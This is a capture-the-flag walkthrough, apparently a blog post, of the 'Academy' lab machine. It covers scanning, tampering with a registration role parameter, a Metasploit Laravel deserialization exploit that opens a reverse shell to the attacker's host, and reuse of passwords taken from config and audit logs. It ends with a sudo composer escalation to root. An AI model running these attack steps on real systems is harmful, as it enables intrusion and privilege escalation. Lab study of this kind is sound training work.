@@ -1,0 +1,319 @@
+Academy
+---
+layout: post
+title: Academy - Walkthrough
+---
+
+Academy was all about enumeration. The foothold requires to use an exploit with the msfconsole. The user part was the more intereseting part in my opinion. Hence I had to make a lot of research on how to filter data inside logs files. Let's dive in !
+
+## Recon
+
+I start with a quick Nmap followed by a full scan with the default script (-C) and the -V tag to get more info about the services.
+
+{% highlight sh %}
+sudo nmap academy && sudo nmap -sCV -p- academy -oN nmap
+{% endhighlight %}
+
+{% highlight text %}
+# Nmap 7.91 scan initiated Sun Nov  8 15:15:46 2020 as: nmap -p- -sCV -oN nmap academy
+Nmap scan report for academy (10.10.10.215)
+Host is up (0.098s latency).
+Not shown: 65532 closed ports
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
+|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
+|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
+80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Did not follow redirect to http://academy.htb/
+33060/tcp open  mysqlx?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
+|     Invalid message"
+|_    HY000
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port33060-TCP:V=7.91%I=7%D=11/8%Time=5FA855CD%P=x86_64-pc-linux-gnu%r(N
+SF:ULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\
+SF:x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOp
+SF:tions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b
+SF:\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVers
+SF:ionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2
+SF:B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fI
+SF:nvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")
+SF:%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01
+SF:\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCookie
+SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x
+SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"
+SF:\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9
+SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\
+SF:x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY0
+SF:00")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,
+SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x0
+SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
+SF:x05HY000")%r(LDAPBindReq,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SIPOptions
+SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"\x05\0\0\0\x0b\x08\x
+SF:05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NCP,9,"
+SF:\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0\0\x0b\x08\x05\x1
+SF:a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000
+SF:")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(WMSRequest,9,"\x05\0\0
+SF:\0\x0b\x08\x05\x1a\0")%r(oracle-tns,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r
+SF:(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x0
+SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
+SF:x05HY000")%r(giop,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+\# Nmap done at Sun Nov  8 15:32:40 2020 -- 1 IP address (1 host up) scanned in 1013.85 seconds
+{% endhighlight %}
+
+
+We have a web server running Apache, SSH and MySqlx. I'm gonna save theses informations for later : 
+
+- Web Server: Apache 2.4.41
+- Domain name: academy.htb
+- Mysqlx on port 33060 
+
+The first thing I do is adding the domain name to my hosts file.
+
+{% highlight sh %}
+
+127.0.0.1	localhost
+127.0.1.1	kali
+
+\# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+10.10.10.215	academy academy.htb
+
+{% endhighlight %}
+
+Now let's have a look at the web site `academy.htb`.
+Pretty simple ! We have two links. One for login and for register. So, I'm gonna register and see what's happening. While I'm doing the registration, I'm keeping `ZAP` opened, this way, I can analyse the requests. 
+
+After the registration, we are redirected to login page `academy.htb/login.php`.
+The registration POST request looks like this:
+
+{% highlight text %}
+POST http://academy.htb/register.php HTTP/1.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 44
+Origin: http://academy.htb
+DNT: 1
+Connection: keep-alive
+Referer: http://academy.htb/register.php
+Cookie: PHPSESSID=u95e78j2a345a3k6dc3muoa2gq
+Upgrade-Insecure-Requests: 1
+Host: academy.htb
+
+uid=rock&password=rock&confirm=rock&roleid=0
+{% endhighlight %}
+
+What is interesting is the `roledid=0`. It seems like we can define our <strong>role</strong> when we register on the website. Which is not ok ! Hence, I keep that in mind for later and right now, I want to poke around with the web site, so, let's try to login and see what we get. 
+
+In the same time, what I like to do is to have some enumeration tools running in the background. Hence I ran `nikto` and `gobuster` to gatter more informations on the website. 
+
+I logged in and explored the web site but I didn't get anything there. On the other hand, `nikto` got some valuable informations. 
+
+{% highlight sh %}
+nikto -h http://academy.htb
+{% endhighlight %}
+
+{% highlight text %}
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.10.215
++ Target Hostname:    academy.htb
++ Target Port:        80
++ Start Time:         2020-12-03 04:57:02 (GMT-5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.41 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Cookie PHPSESSID created without the httponly flag
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ /config.php: PHP Config file may contain database IDs and passwords.
++ OSVDB-29786: /admin.php?en_log_id=0&action=config: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
++ OSVDB-29786: /admin.php?en_log_id=0&action=users: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
++ OSVDB-3092: /admin.php: This might be interesting...
++ /login.php: Admin login page/section found.
++ 7786 requests: 0 error(s) and 10 item(s) reported on remote host
++ End Time:           2020-12-03 05:12:19 (GMT-5) (917 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+{% endhighlight %}
+
+Nikto reports the existence of an `admin.php` page so, let's have a look at it !
+
+It is exactly the same page as `login.php` but this time, if I try to login, nothing happens. I guess I have to be an admin to connect to that page. 
+
+I think that if I try to create an account and modify the request by changing the `roleid` from 0 to 1, it might be possible to connect here. 
+To do that, I can use ZAP to intercept the request and modify it directly. 
+
+>uid=rockadmin&password=rock&confirm=rock&roleid=0
+
+Becomes
+
+>uid=rockadmin&password=thanksForReading&confirm=rock&roleid=1
+
+Now, let's try to login inside with the admin page again. 
+It worked !
+
+We now have access to the admin panel. Inside of it, we have a reference to a `dev-staging-01.academy.htb` subdomain. I'm gonna add that to my `hosts` file and then visit that page. 
+
+## Foothold
+
+Clearly, this a `Laravel` error page. Which is nice because we have a lot of informations there. I'm not gonna bother to explain every research that I made here but in this very case, the most valuable information will be the `APP_KEY`.
+
+>APP_KEY "base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0="
+
+Very quickly, I found an exploit on Google to abuse a vulnerability inside Laravel. 
+
+>This module exploits a vulnerability in the PHP Laravel Framework for versions 5.5.40, 5.6.x <= 5.6.29. Remote Command Execution is possible via a correctly formatted HTTP X-XSRF-TOKEN header, due to an insecure unserialize call of the decrypt method in Illuminate/Encryption/Encrypter.php. Authentication is not required, however exploitation requires knowledge of the Laravel APP_KEY. Similar vulnerabilities appear to exist within Laravel cookie tokens based on the code fix. In some cases the APP_KEY is leaked which allows for discovery and exploitation.
+
+We just to start the `msfconsole` and then, run a few commands.
+
+{% highlight text %}
+sudo msfconsole
+{% endhighlight %}
+
+{% highlight sh %}
+msf6 > use exploit/unix/http/laravel_token_unserialize_exec
+msf6 exploit(unix/http/laravel_token_unserialize_exec) > options
+{% endhighlight %}
+
+{% highlight text %}
+Module options (exploit/unix/http/laravel_token_unserialize_exec):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   APP_KEY                     no        The base64 encoded APP_KEY string from the .env file
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port\[...\]
+   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:\<path\>'
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Path to target webapp
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+{% endhighlight %}
+
+{% highlight sh %}
+msf6 exploit(unix/http/laravel_token_unserialize_exec) > set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
+APP_KEY => dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
+msf6 exploit(unix/http/laravel_token_unserialize_exec) > set rhosts 10.10.10.215
+rhosts => 10.10.10.215
+msf6 exploit(unix/http/laravel_token_unserialize_exec) > set vhost dev-staging-01.academy.htb
+vhost => dev-staging-01.academy.htb
+msf6 exploit(unix/http/laravel_token_unserialize_exec) > set lhost tun0
+lhost => 10.10.14.7
+{% endhighlight %}
+
+{% highlight sh %}
+msf6 exploit(unix/http/laravel_token_unserialize_exec) > run
+{% endhighlight %}
+
+And we got a shell !
+
+{% highlight sh %}
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+{% endhighlight %}
+
+
+## User (cry0l1t3)
+
+The shell that we got is very limited so I want to upgrade to a better one. What I did is uploading my reverse php shell on the main website. This way I can connect more easily and have a better shell. 
+
+I copied my php file in the `/var/www/html/academy/public` folder.
+Then I set up a `netcat` listener and browse to my reverse shell. 
+
+Now that I got a better shell, I can start to enumerate the box. When we were on the `dev-staging-01` error page, we got access to the `.env` file of the subdomain website. Now that we got inside the box, we should check the `.env` file of the main website because Laravel stores a lot of valuable informations there. 
+
+So, inside of `/var/www/html/academy/public/.env` website, I found a password:
+
+>mySup3rP4s5w0rd!!
+
+It's a password for the database but as some people say, 'Human are beasts of habbits' so I tried the password with every username that I found inside the `/etc/passwd` file and voila, we got our first user !
+
+{% highlight sh %}
+id
+uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
+{% endhighlight %}
+
+
+## User (mrb3n)
+
+The user `cry0l1t3` is part of `adm` group, which means that we have access to pretty much all the log files. 
+
+
+At first, I tried my best `grep` commands but the amount of data is to huge to filter the results properly. I needed to either, narrow down my search of to find a more suitable tool to filter these log files. 
+
+After a bit of research, I've found some 2 great [article1](https://blog.selectel.com/auditing-system-events-linux/), [article2](https://blog.selectel.com/auditing-system-events-linux/)
+
+The articles speak about a tool called `ausearch`. I didn't know it before and I was happy to see that it's available on the target machine so we don't even have install it. With that tool, we can investigate the audit log files and filter the results in a better way.
+
+I've found a [list](https://docs.oracle.com/cd/E37100_01/doc.121/e27777/lin_eventdata.htm#SIGAU41047) of all type of events that we can use to narrow down the search. 
+
+I looked for `tty` events and I got way less results. 
+
+{% highlight sh %}
+ausearch -m tty
+{% endhighlight %}
+
+{% highlight text %}
+
+time->Wed Aug 12 02:28:10 2020
+type=TTY msg=audit(1597199290.086:83): tty pid=2517 uid=1002 auid=0 ses=1 major=4 minor=1 comm="sh" data=7375206D7262336E0A
+
+time->Wed Aug 12 02:28:13 2020
+type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A
+
+{% endhighlight %}
+
+Interestingly, the `data` are in `hex` so I used [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hex('None')&input=NkQ3MjYyMzM2RTVGNDE2MzQwNjQzMzZENzkyMTBB) to decode it and boom, we got we were looking for. 
+
+The user `cry0l1t3` switch to user `mrb3n` using the password `mrb3n_Ac@d3my!
+`.
+
+## Root
+
+One of the first thing I do when I escalate to a new user is runnig the `sudo -l` command. This way, I know if I can run a special command. 
+
+In this case, we can run the `/usr/bin/composer` command. 
+ 
+A quick search on [GTFOBins](https://gtfobins.github.io/gtfobins/composer/) and we have our way to root. 
+
+>TF=$(mktemp -d)
+>
+>echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
+>
+>sudo composer --working-dir=$TF run-script x
+
+{% highlight sh %}
+id
+uid=0(root) gid=0(root) groups=0(root)
+{% endhighlight %}
+
+<strong>Rooted ;)</strong>
